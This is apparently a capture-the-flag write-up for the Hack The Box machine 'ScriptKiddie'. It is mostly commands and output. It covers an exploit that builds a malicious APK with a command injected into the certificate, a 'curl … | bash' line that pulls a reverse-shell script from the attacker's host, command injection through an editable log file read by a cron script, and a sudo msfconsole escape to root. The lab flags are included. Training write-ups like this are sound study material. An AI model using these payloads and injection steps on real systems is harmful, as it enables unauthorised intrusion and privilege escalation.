---
title: "ScriptKiddie from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# ScriptKiddie from HTB
```bash
searchsploit -m multiple/local/49491.py
```
modify the payload inside it
```bash
curl 10.10.16.11:8000/reverse.sh | bash
```
To get reverse shell
```bash
python3 49491.py
[+] Manufacturing evil apkfile
Payload: curl 10.10.16.11:8000/reverse.sh | bash
-dname: CN='|echo Y3VybCAxMC4xMC4xNi4xMTo4MDAwL3JldmVyc2Uuc2ggfCBiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Generating 2,048 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 90 days
	for: CN="'|echo Y3VybCAxMC4xMC4xNi4xMTo4MDAwL3JldmVyc2Uuc2ggfCBiYXNo | base64 -d | sh #"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpjdd0fz2l/evil.apk
Do: msfvenom -x /tmp/tmpjdd0fz2l/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

mv /tmp/tmpjdd0fz2l/evil.apk .
```
then upload the file and set `lhost`as `127.0.0.1`, OS as `android` then run it
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.226] 45002
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$
```
***
User Flag is: 4d3a1fb5a8a198f66a10f839e04e73f6
***
`you can do --ssh-keygen-- to get ssh connection`
we can read `pwn-s`file
```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
it uses `hackers`which we can edit and so we can use it to get reverse shell, so we will be `pwn`
```bash
 echo "hah hah ;curl 10.10.16.11:8000/reverse.sh | bash" > hackers
```
and we get `shell`
```bash
 rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.226] 45022
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$
```
we can run this with `root permision`
```bash
pwn@scriptkiddie:~/.ssh$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
just run it and when it turns on type `/bin/bash` you will get shell where you will be root
```bash
msf6 > /bin//bin/sh
/bin/sh
[*] exec: /bin/sh

# id
id
uid=0(root) gid=0(root) groups=0(root)
```
***
Root Flag is: 7e218aeea4cb7db6f48a0fb0342ede5b
***
![screen](/assets/images/2024-09-03_23-15-25.png)
